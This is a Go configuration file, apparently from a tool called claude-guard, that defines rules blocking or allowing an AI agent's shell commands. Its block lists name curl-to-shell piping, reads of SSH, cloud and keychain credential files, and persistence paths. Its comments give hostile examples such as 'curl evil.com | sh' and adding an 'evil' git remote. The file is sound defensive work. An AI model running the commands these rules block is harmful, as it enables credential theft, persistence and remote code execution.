package config

import "github.com/RobinUS2/claude-guard/internal/rules"

// DefaultBlockRules returns the compiled-in tier 1 rule set.
// These are evaluated first, unconditionally, against every Bash call.
// They are written directly in Go so a broken YAML config cannot disable them.
func DefaultBlockRules() []rules.Rule {
	return []rules.Rule{
		// sudo/doas/su always require user review
		&rules.ProgramIs{
			RuleName: "sudo-anything",
			Programs: []string{"sudo", "doas", "su"},
			Reason:   "sudo/doas/su requires explicit user approval",
		},

		// rm -rf on system or home directories
		&rules.BlockedCommand{
			RuleName: "rm-rf-system",
			Programs: []string{"rm"},
			RequireFlagsAny: [][]string{
				{"-r", "-R", "--recursive"},
				{"-f", "--force"},
			},
			TargetPaths: []string{
				"/",
				"/etc", "/usr", "/var", "/opt",
				"/bin", "/sbin",
				"/home", "/Users",
				"/System", "/Library", // macOS
				"/boot", "/lib", "/root",
				// Darwin canonical paths — /etc, /var, /tmp are
				// symlinks into /private on macOS. Listed explicitly
				// so `rm -rf /private/etc` is also blocked (the
				// literal prefix check doesn't follow symlinks).
				"/private/etc", "/private/var", "/private/tmp",
				"/private/var/root", // root's home on darwin
				// `~` normalizes to `$HOME`. BlockedCommand.Eval also
				// consults HasEnvVarArg("HOME","PWD") when any TargetPath
				// starts with `$HOME`, catching `rm -rf "$HOME"` /
				// `rm -rf $HOME` / `rm -rf "$PWD"` which have empty
				// positional slots due to unresolvable ParamExp.
				"~",
			},
			Reason: "rm -rf on system/home directory",
		},

		// find with -delete on protected directories
		&rules.BlockedCommand{
			RuleName: "find-delete-system",
			Programs: []string{"find"},
			// find uses long-form -delete; require it at all, no flag-group needed
			// (BlockedCommand will match if RequireFlagsAny is empty, so we use
			// a single-group spec that accepts any of the destructive flags)
			RequireFlagsAny: [][]string{
				{"-delete", "-exec"},
			},
			TargetPaths: []string{
				"/", "/etc", "/usr", "/var", "/home", "/Users", "/System", "/Library",
				"/private/etc", "/private/var", "/private/tmp", "/private/var/root",
				"~",
			},
			Reason: "find -delete/-exec on system/home directory",
		},

		// curl | sh and variants
		&rules.PipeToShell{
			RuleName:       "curl-pipe-sh",
			SourcePrograms: []string{"curl", "wget", "fetch", "http", "httpie"},
			SinkPrograms:   []string{"sh", "bash", "zsh", "fish", "dash", "ksh", "/bin/sh", "/bin/bash"},
			Reason:         "remote code execution via pipe to shell",
		},

		// bash <(curl ...) and variants
		&rules.ProcSubToShell{
			RuleName:     "procsub-to-shell",
			SinkPrograms: []string{"sh", "bash", "zsh", "fish", "dash", "ksh"},
			Reason:       "remote code execution via process substitution",
		},

		// force push to protected branches
		&rules.GitForcePush{
			RuleName:          "git-force-push-protected",
			ProtectedBranches: []string{"main", "master", "production", "prod", "release", "develop", "trunk"},
			Reason:            "force push to protected branch",
		},

		// SSH file access from non-ssh programs — covers private keys
		// AND auxiliary SSH files (authorized_keys, known_hosts,
		// config) because an attacker writing to authorized_keys
		// establishes persistence just as surely as exfiling a
		// private key. ExcludePrograms covers the SSH tool family
		// that legitimately reads these (`ssh-add ~/.ssh/id_rsa`,
		// `git` reading ~/.ssh/config for deploy keys, etc.).
		//
		// NOTE: this rule supersedes a narrower `~/.ssh/*` entry
		// previously in `extended-credentials`, which lacked
		// ExcludePrograms and broke ssh-add. Keeping the rule name
		// `ssh-private-key` for log-continuity even though it now
		// covers more than just private keys.
		&rules.PathAccess{
			RuleName: "ssh-private-key",
			Paths: []string{
				"~/.ssh/id_*", "**/.ssh/id_*",
				"~/.ssh/authorized_keys", "**/.ssh/authorized_keys",
				"~/.ssh/known_hosts", "**/.ssh/known_hosts",
				"~/.ssh/config", "**/.ssh/config",
			},
			ExcludePrograms: []string{"ssh", "ssh-add", "ssh-keygen", "ssh-copy-id", "git", "gh"},
			Reason:          "access to SSH file outside of ssh-family tools",
		},

		// GPG/AWS/GCP credential file access
		&rules.PathAccess{
			RuleName:        "credential-files",
			Paths:           []string{"~/.aws/credentials", "~/.gnupg/secring.gpg", "~/.config/gcloud/application_default_credentials.json"},
			ExcludePrograms: []string{"aws", "gpg", "gpg2", "gcloud"},
			Reason:          "access to cloud/pgp credential file",
		},

		// System credential files
		&rules.PathAccess{
			RuleName: "system-credentials",
			Paths:    []string{"/etc/shadow", "/etc/master.passwd", "/etc/sudoers", "/etc/sudoers.d/*"},
			Reason:   "access to system credential file",
		},

		// Persistence / tamper paths — shell init files and system
		// DNS that, when written, establish attacker persistence
		// (next login runs the malicious line) or redirect traffic
		// (hosts file override). Reads are fine; writes via redir
		// target are what matters and step 5's redir-aware PathAccess
		// catches them.
		&rules.PathAccess{
			RuleName: "persistence-tamper",
			Paths: []string{
				"~/.bashrc", "~/.bash_profile", "~/.bash_login", "~/.profile",
				"~/.zshrc", "~/.zprofile", "~/.zlogin", "~/.zshenv",
				"~/.config/fish/config.fish",
				"~/.tmux.conf",
				"~/.vimrc", "~/.config/nvim/init.vim", "~/.config/nvim/init.lua",
				"/etc/hosts", "/etc/resolv.conf",
				"/private/etc/hosts", "/private/etc/resolv.conf",
			},
			WriteOnly: true, // reading these files is fine; only writes establish persistence
			Reason:    "write to shell init / dns / editor config would establish persistence",
		},

		// Extended credential file coverage — red-team report H-1
		// enumerates ~10 path shapes not covered by the legacy rules.
		// ExcludePrograms intentionally narrow: vendor tools reading
		// their OWN config via a flag (e.g. `kubectl config view`)
		// don't mention the path in args and won't match PathAccess
		// anyway. A direct `cat ~/.kube/config` — which is what an
		// exfil attempt looks like — is blocked by this rule.
		&rules.PathAccess{
			RuleName: "extended-credentials",
			Paths: []string{
				// macOS
				"~/Library/Keychains/*", "~/Library/Keychains/**",
				"~/Library/Cookies/*", "~/Library/Cookies/**",
				// GitHub CLI OAuth token
				"~/.config/gh/hosts.yml", "~/.config/gh/*",
				// Basic-auth + machine creds (curl/wget/ftp read this
				// implicitly — DIRECT read is the exfil vector)
				"~/.netrc",
				// Docker registry tokens
				"~/.docker/config.json", "~/.docker/*",
				// Kubernetes — contexts, cluster creds, tokens
				"~/.kube/config", "~/.kube/*",
				// PyPI upload tokens
				"~/.pypirc",
				// Git config often contains credential.helper / signing
				// key; .git-credentials is plaintext store.
				"~/.gitconfig", "~/.git-credentials",
				// SSH files are covered by the dedicated
				// `ssh-private-key` rule above (which has
				// ExcludePrograms for ssh-add, ssh-keygen etc.).
				// Leaving ~/.ssh/* OUT of extended-credentials
				// avoids blocking `ssh-add ~/.ssh/id_rsa`.
				// AWS — widen. `config` holds MFA ARNs, `sso/cache`
				// holds short-lived creds.
				"~/.aws/*",
				// gcloud — widen beyond ADC json.
				"~/.config/gcloud/*",
			},
			Reason: "access to vendor/user credential file",
		},

		// Vendor-config write subcommands — these write to ~/.kube/,
		// ~/.docker/, etc. without the path appearing in the command
		// text, so PathAccess alone can't see them. Tier-1 denies
		// the specific mutating sub-verbs; legitimate auth flows
		// (gh auth login etc.) prompt the user.
		&rules.NestedSubcommand{
			RuleName: "kubectl-config-write",
			Program:  "kubectl",
			Destructive: []string{
				"config/set", "config/set-cluster", "config/set-context",
				"config/set-credentials", "config/unset",
				"config/delete-cluster", "config/delete-context",
				"config/rename-context",
			},
			Reason: "kubectl config mutation writes ~/.kube/config",
		},
		&rules.NestedSubcommand{
			RuleName: "oc-config-write",
			Program:  "oc",
			Destructive: []string{
				"config/set", "config/set-cluster", "config/set-context",
				"config/set-credentials", "config/unset",
				"config/delete-cluster", "config/delete-context",
				"config/rename-context",
			},
			Reason: "oc config mutation",
		},
		&rules.NestedSubcommand{
			RuleName: "aws-configure-write",
			Program:  "aws",
			Destructive: []string{
				"configure/set", "configure/import",
			},
			Reason: "aws configure writes ~/.aws/",
		},
		&rules.NestedSubcommand{
			RuleName: "gcloud-auth-write",
			Program:  "gcloud",
			Destructive: []string{
				"auth/login", "auth/application-default", "auth/revoke",
				"config/set", "config/unset",
			},
			Reason: "gcloud auth/config mutation",
		},
		&rules.NestedSubcommand{
			RuleName: "docker-login",
			Program:  "docker",
			Destructive: []string{
				"login", "logout",
			},
			Reason: "docker login writes ~/.docker/config.json",
		},

		// `<shell> -c '<script>'` — the inner script is opaque to the
		// outer AST parser, so no matcher can reason about what will
		// actually execute. Always prompt the user.
		&rules.ShellDashC{
			RuleName: "shell-dash-c",
			Shells:   []string{"sh", "bash", "zsh", "fish", "dash", "ksh", "tcsh", "csh"},
			Reason:   "shell -c wraps an opaque script string that isn't AST-analyzable",
		},

		// Script interpreters with inline-code flags — same opaque-script
		// risk as `bash -c`, just different flag conventions. Python
		// uses `-c`, Perl/Ruby/Node use `-e` (Node also accepts
		// `--eval`).
		&rules.ScriptInterpreterExec{
			RuleName:     "script-interpreter-exec",
			Interpreters: []string{"python", "python3", "perl", "ruby", "node"},
			ExecFlags:    []string{"-c", "-e", "--eval"},
			Reason:       "script interpreter with inline code (-c / -e) wraps opaque code",
		},

		// git config writes — tier-2 `git-readonly` allows `git config`
		// for the common read shapes (`git config user.name`,
		// `git config --list`), but `git config user.signingkey EVIL`
		// or `git config core.hooksPath /tmp/hooks` are supply-chain
		// attacks. GitConfigWrite uses a flag-decision-tree (not
		// positional counting alone) so `--get-regexp` reads aren't
		// misclassified as writes.
		&rules.GitConfigWrite{
			RuleName: "git-config-write",
			Reason:   "git config write requires user approval",
		},
		// git remote mutations — tier-2 `git-readonly` allows
		// `git remote` / `git remote -v` / `git remote show`, but
		// `git remote add evil https://evil.git` / `git remote set-url`
		// hijack future pushes. Denied here.
		&rules.NestedSubcommand{
			RuleName: "git-remote-mutation",
			Program:  "git",
			Destructive: []string{
				"remote/add",
				"remote/remove",
				"remote/rm",
				"remote/rename",
				"remote/set-url",
				"remote/set-branches",
				"remote/set-head",
				"remote/prune",
				"remote/update",
			},
			Reason: "git remote mutation requires user approval",
		},

		// gh destructive verbs — tier-2 `gh-readonly` only checks the
		// outer noun (pr/issue/repo/run/api/…), so `gh pr merge`,
		// `gh repo delete`, `gh pr review --approve` instant-allowed
		// before this rule. Covers the (noun, verb) pairs that
		// mutate GitHub state, plus aliases/extensions (can wrap
		// arbitrary commands) and codespaces (cloud VM control).
		&rules.NestedSubcommand{
			RuleName: "gh-destructive",
			Program:  "gh",
			Destructive: []string{
				"repo/delete", "repo/archive", "repo/edit", "repo/sync",
				"pr/merge", "pr/close", "pr/delete", "pr/edit", "pr/reopen",
				"pr/review", // --approve refinement handled by LLM; broad deny for review is safe
				"issue/close", "issue/delete", "issue/edit", "issue/reopen",
				"run/rerun", "run/cancel", "run/delete", "run/watch",
				"workflow/run", "workflow/disable", "workflow/enable",
				"secret/set", "secret/delete", "secret/remove",
				"variable/set", "variable/delete",
				"auth/token", "auth/logout", "auth/refresh", "auth/setup-git",
				"ssh-key/add", "ssh-key/delete",
				"gpg-key/add", "gpg-key/delete",
				"alias/set", "alias/delete", "alias/import",
				"extension/install", "extension/exec", "extension/remove", "extension/upgrade",
				"codespace/create", "codespace/delete", "codespace/ssh", "codespace/stop",
				// `gh api graphql` supports arbitrary mutations via
				// `-f query='mutation { … }'`. Any graphql = deny.
				"api/graphql",
			},
			Reason: "gh destructive verb (account/repo/workflow mutation)",
		},
		// `gh api` with mutating HTTP methods — covers the shapes the
		// (noun, verb) matcher above can't express because the method
		// is a flag value, not a positional.
		&rules.GhApiMutation{
			RuleName:      "gh-api-mutation",
			MutatingVerbs: []string{"DELETE", "POST", "PATCH", "PUT"},
			Reason:        "gh api with mutating HTTP method",
		},

		// terraform state mutations — `state rm`, `state mv`, etc.
		// mutate state without touching infrastructure, which then
		// causes the next `terraform apply` to recreate resources
		// (data loss). `terraform import` is also a state mutation.
		// The outer `terraform-readonly` tier-2 rule approves reads
		// (`terraform plan`, `terraform state list`). This deny list
		// carves out the specific destructive verbs so they prompt
		// the user even though tier-2 would otherwise approve them.
		&rules.NestedSubcommand{
			RuleName: "terraform-state-mutation",
			Program:  "terraform",
			Destructive: []string{
				"state/rm",
				"state/mv",
				"state/push",
				"state/replace-provider",
				"state/rename",
				"import", // any `terraform import` args = deny
			},
			Reason: "terraform state mutation requires user approval",
		},
	}
}

// DefaultAllowRules returns the compiled-in tier 2 rule set. These are
// AST-anchored allow rules — they only match when the command has no
// redirections, pipes, subshells, or command substitution, AND the
// program is fully resolved to a literal.
func DefaultAllowRules() []rules.Rule {
	// Define individual rules as variables so they can be referenced both
	// as standalone tier 2 rules AND as inner rules for CdPrefixed.

	// Read-only POSIX and text tools.
	//
	// `env`, `awk`, `sed`, `find` are deliberately NOT in this list:
	//   - env is a wrapper program (`env rm -rf /etc` runs rm, but
	//     the outer call's Program is `env`, so rm-rf-system can't
	//     see it).
	//   - awk has `system()` / `getline "cmd"` / pipe-to shell
	//     escapes that aren't flag-filterable.
	//   - GNU sed has the `e` command (exec) and `w` command (write
	//     file). Same escape problem.
	//   - find has `-exec` / `-execdir` / `-delete` / `-fprint*`.
	//     Its own narrower `find-readonly` rule below handles the
	//     safe shape; keeping it out of posix-readonly ensures
	//     `find -exec rm …` doesn't short-circuit to allow.
	// All four fall through to the LLM tier.
	posixReadonly := &rules.AnchoredCommand{
		RuleName: "posix-readonly",
		Programs: []string{
			"ls", "cat", "head", "tail", "wc", "sort", "uniq",
			"grep", "rg", "ripgrep", "ack", "ag",
			"tree", "file", "stat",
			"du", "df",
			"which", "whereis", "type",
			"printenv", "id", "whoami", "hostname", "uname", "pwd",
			"echo", "printf", "date",
			"jq", "yq",
			"cmp", "diff",
			"tar", "zcat", "gzcat",
			"xxd", "od", "hexdump",
		},
	}

	// find — safe when no destructive flag. `-fprint`, `-fprintf`,
	// `-fls` all write to files; added per red-team review.
	findReadonly := &rules.AnchoredCommand{
		RuleName:    "find-readonly",
		Programs:    []string{"find"},
		ForbidFlags: []string{"-delete", "-exec", "-execdir", "-fprint", "-fprintf", "-fls"},
	}

	// git read-only subcommands
	gitReadonly := &rules.AnchoredCommand{
		RuleName: "git-readonly",
		Programs: []string{"git"},
		RequireSubcmdAny: []string{
			// Read commands
			"status", "log", "diff", "show", "branch", "remote",
			"blame", "rev-parse", "ls-files", "ls-tree", "describe", "config",
			// Workflow commands (safe — local operations)
			"worktree", "add", "commit", "fetch", "pull", "merge",
			"stash", "tag", "switch", "restore", "checkout",
			// NOTE: `push` is intentionally NOT here — push to
			// protected branches (main/master) should go through
			// LLM or per-project config, not auto-approve.
		},
	}

	// gcloud read-only — NestedSubcommandAllow handles the deep
	// subcommand tree that AnchoredCommand can't: `gcloud projects
	// list`, `gcloud compute instances list`, `gcloud iam
	// service-accounts list`. The rule requires the LAST positional
	// to be a SafeVerb (the read verb), every positional to be a
	// safe identifier (no `gs://…`, `projects/foo`, `:` shapes),
	// and blocks impersonation/credential-override flags that would
	// change the effective principal.
	//
	// Mutating verbs (`create`, `delete`, `deploy`, `update`, `set`,
	// `submit`) are absent → they fall through to LLM / user prompt.
	// Tier-1 `gcloud-auth-write` still denies config/auth mutations
	// regardless of whether tier 2 would approve.
	gcloudReadonly := &rules.NestedSubcommandAllow{
		RuleName: "gcloud-readonly",
		Programs: []string{"gcloud"},
		// gcloud is noun-verb: `gcloud projects list` — verb at tail.
		VerbPosition: rules.VerbLast,
		SafeVerbs: []string{
			"list", "describe", "get-value",
			"get-iam-policy", "get-ancestors-iam-policy",
			"list-available-services", "list-enabled-services",
			"version", "help",
		},
		// Defense-in-depth against the SafeVerb-padding bypass on
		// noun-verb gcloud (`gcloud projects create list` —
		// `list` at tail satisfies VerbLast, but `create` in the
		// middle is the real action). Reject if any positional
		// matches a known destructive verb.
		//
		// Deliberately omits tokens that also serve as gcloud
		// product nouns: `run` (Cloud Run), `build`/`builds`,
		// `config`, `auth`, `iam`, `projects`, etc. Those are
		// legitimately mid-positional in read commands like
		// `gcloud run services list`, and forbidding them would
		// cause false-positive rejects. The verb-last anchor
		// still gates the final positional against SafeVerbs.
		ForbidVerbs: []string{
			"create", "delete", "deploy", "update", "set", "unset",
			"submit", "add", "remove", "import", "export",
			"enable", "disable", "revoke", "grant", "apply",
			"ssh", "scp",
			"activate", "deactivate", "attach", "detach", "push",
			"migrate", "replace", "patch", "scale", "reset",
			"rollback", "promote", "copy", "move", "clone",
			"purge", "clear", "edit",
			"install", "uninstall", "upgrade",
			"set-iam-policy", "add-iam-policy-binding", "remove-iam-policy-binding",
			"stop", "kill", "pause",
			"snapshot", "restore", "untag",
			"sign-blob", "sign-jwt", "sign-url",
		},
		ForbidFlags: []string{
			"--impersonate-service-account",
			"--account",
			"--configuration",
			"--credential-file-override",
			"--billing-project",
			"--access-token-file",
			"--quota-project",
			"--log-http",
		},
	}

	// gsutil read-only — same pattern as gcloud. `gsutil ls` (bare,
	// no bucket arg) matches; `gsutil ls gs://bucket` does NOT because
	// `gs://bucket` fails the safe-identifier check. That's by design
	// — bucket-scoped ops should go through the LLM tier or explicit
	// user approval.
	gsutilReadonly := &rules.NestedSubcommandAllow{
		RuleName: "gsutil-readonly",
		Programs: []string{"gsutil"},
		// gsutil is verb-first: `gsutil ls`, `gsutil stat gs://…`.
		VerbPosition: rules.VerbFirst,
		SafeVerbs:    []string{"ls", "stat", "du", "hash", "version", "help"},
		ForbidFlags: []string{
			"--impersonate-service-account",
			"--account",
			// gsutil also accepts short top-level flags -i (impersonate),
			// -o (override boto config), -u (billing project).
			"-i",
			"-o",
			"-u",
		},
	}

	// bq (BigQuery) read-only — NestedSubcommandAllow for the nested
	// cases (`bq show`, `bq ls`, `bq query`), replacing the old
	// AnchoredCommand shape. Safe-identifier rule means
	// `bq show my-dataset.my-table` matches (`.` is allowed) but
	// `bq show my-proj:my-dataset.my-table` does not (`:` blocked).
	bqReadonly := &rules.NestedSubcommandAllow{
		RuleName: "bq-readonly",
		Programs: []string{"bq"},
		// bq is verb-first: `bq show`, `bq ls`, `bq head …`.
		VerbPosition: rules.VerbFirst,
		SafeVerbs:    []string{"show", "ls", "query", "head", "version", "help"},
		ForbidFlags: []string{
			"--service_account",
			"--service_account_credential_file",
			"--application_default_credential_file",
			"--oauth_access_token",
		},
	}

	// terraform read-only
	//
	// `state` is intentionally NOT in this list — the subcommand
	// tree is too deep for AnchoredCommand (cannot distinguish
	// `state list` from `state rm`). `terraform state ...` falls
	// to the LLM tier which reasons about the full command.
	// Tier-1 `terraform-state-mutation` still denies the
	// destructive verbs regardless of tier 2.
	terraformReadonly := &rules.NestedSubcommandAllow{
		RuleName: "terraform-readonly",
		Programs: []string{"terraform"},
		// terraform is verb-first: `terraform plan`, `terraform state list`.
		// For `terraform state list` the last positional `list` is fine,
		// but the verb anchor is the first positional (`state`) which
		// IS in SafeVerbs. Specific destructive state verbs (`state rm`,
		// `state mv`, `state push`) fall through because only the head
		// is matched and tier-1 `terraform-state-mutation` catches them
		// anyway. `plan -out=tfplan` writes a file but is considered
		// safe (no infra change).
		VerbPosition: rules.VerbFirst,
		SafeVerbs: []string{
			"plan", "validate", "fmt", "show", "version",
			"output", "console", "workspace", "providers", "state",
		},
	}

	// docker read-only
	dockerReadonly := &rules.AnchoredCommand{
		RuleName:         "docker-readonly",
		Programs:         []string{"docker", "podman"},
		RequireSubcmdAny: []string{"ps", "images", "inspect", "logs", "port", "top", "stats", "version", "info", "history", "events"},
	}

	// kubectl read-only — nested (noun, verb) shape (e.g.
	// `kubectl get pods`, `kubectl describe deployment x`). Exec/
	// apply/delete/patch/edit/scale are writes (absent from SafeVerbs)
	// and fall to LLM. Tier-1 `kubectl-config-write` already blocks
	// `kubectl config set-*`.
	kubectlReadonly := &rules.NestedSubcommandAllow{
		RuleName: "kubectl-readonly",
		Programs: []string{"kubectl", "oc"},
		// kubectl is verb-first: `kubectl get pods`, `kubectl describe node`.
		VerbPosition: rules.VerbFirst,
		SafeVerbs: []string{
			"get", "describe", "logs", "top", "explain",
			"api-resources", "api-versions", "version", "cluster-info",
		},
	}

	// firebase read-only — small surface, still tightly controlled
	// since deploy/database:set are destructive.
	firebaseReadonly := &rules.NestedSubcommandAllow{
		RuleName: "firebase-readonly",
		Programs: []string{"firebase"},
		// firebase is verb-first: `firebase list`, `firebase version`.
		VerbPosition: rules.VerbFirst,
		SafeVerbs:    []string{"list", "help", "version"},
		ForbidFlags: []string{
			// --token pins to a CI token which may have broader scope
			// than the local user; --project overrides the effective
			// project. Both are principal redirects.
			"--token",
			"--project",
		},
	}

	// go read-only / safe
	goReadonly := &rules.AnchoredCommand{
		RuleName:         "go-readonly",
		Programs:         []string{"go"},
		RequireSubcmdAny: []string{"version", "env", "list", "vet", "fmt", "doc", "help"},
	}

	// npm/yarn/pnpm read-only
	nodePmReadonly := &rules.AnchoredCommand{
		RuleName:         "node-pm-readonly",
		Programs:         []string{"npm", "yarn", "pnpm"},
		RequireSubcmdAny: []string{"list", "ls", "view", "outdated", "audit", "config", "whoami", "why", "info", "version"},
	}

	// gh read-only
	ghReadonly := &rules.AnchoredCommand{
		RuleName:         "gh-readonly",
		Programs:         []string{"gh"},
		RequireSubcmdAny: []string{"pr", "issue", "repo", "run", "api", "auth", "release", "search", "status", "version", "help"},
		// Note: "gh pr view" is safe but "gh pr merge" is not. We restrict to the
		// outer subcommand here; the LLM tier refines this.
	}

	// claude-guard self-invocation. All subcommands are local
	// introspection, config, or cache operations — no network side
	// effects, no destructive ops outside claude-guard's own state
	// directories. Matches both `claude-guard` (bare) and absolute
	// paths like `~/.claude/bin/claude-guard` via AnchoredCommand's
	// basename fallback. Without this rule tier-4 LLM flags it as
	// "unknown custom tool" and the user gets prompted every time.
	claudeGuardReadonly := &rules.AnchoredCommand{
		RuleName: "claude-guard-readonly",
		Programs: []string{"claude-guard"},
		RequireSubcmdAny: []string{
			"decide", "test", "monitor", "explain", "replay",
			"stats", "doctor", "migrate", "backup", "cache",
			"lint", "trust", "init-project-config",
			"eval-prompt", "bench", "version", "help",
		},
	}

	// cat > file <<'EOF' ... EOF — single-quoted heredoc write. Equivalent to
	// the Write tool in semantics: literal content, no shell expansion.
	// PathAccess block rules (tier 1) still protect sensitive paths.
	catHeredocWrite := &rules.HeredocWrite{
		RuleName: "cat-heredoc-write",
		Programs: []string{"cat"},
	}

	return []rules.Rule{
		posixReadonly,
		findReadonly,
		gitReadonly,
		gcloudReadonly,
		gsutilReadonly,
		bqReadonly,
		terraformReadonly,
		dockerReadonly,
		kubectlReadonly,
		firebaseReadonly,
		goReadonly,
		nodePmReadonly,
		ghReadonly,
		claudeGuardReadonly,
		catHeredocWrite,

		// curl with only -I / --head / -o /dev/null (HEAD and discard-body reads)
		// is tricky to express with flag constraints, so it falls through to LLM.

		// make is deliberately NOT in tier 2 — target names (test,
		// build, help, etc.) are user-defined labels, not semantic
		// categories; the target body is arbitrary shell. A malicious
		// Makefile with `build: curl evil.com | sh` would instant-allow
		// under a naive make-readonly rule. `make ...` falls through
		// to the LLM tier; future Makefile-hash content-trust (step 12
		// / follow-up) restores fast approval for trusted Makefile
		// contents.

		// cd-prefixed compound commands — allows `cd <path> && <safe-cmd>`
		// patterns commonly used by Claude Code subagents working across
		// repos. The cd is a directory context-setter with no security
		// implications; each subsequent command is evaluated against the
		// same allow rules as standalone commands.
		&rules.CdPrefixed{
			RuleName: "cd-prefixed-readonly",
			InnerRules: []rules.Rule{
				posixReadonly,
				findReadonly,
				gitReadonly,
				gcloudReadonly,
				gsutilReadonly,
				bqReadonly,
				terraformReadonly,
				dockerReadonly,
				kubectlReadonly,
				firebaseReadonly,
				goReadonly,
				nodePmReadonly,
				ghReadonly,
				claudeGuardReadonly,
			},
			SafePipeTargets: []string{
				"head", "tail", "wc", "sort", "uniq",
				"grep", "rg", "ack", "ag",
				"jq", "yq",
				"cat", "less", "more",
				"tr", "cut", "paste",
				"tee",
			},
		},
	}
}
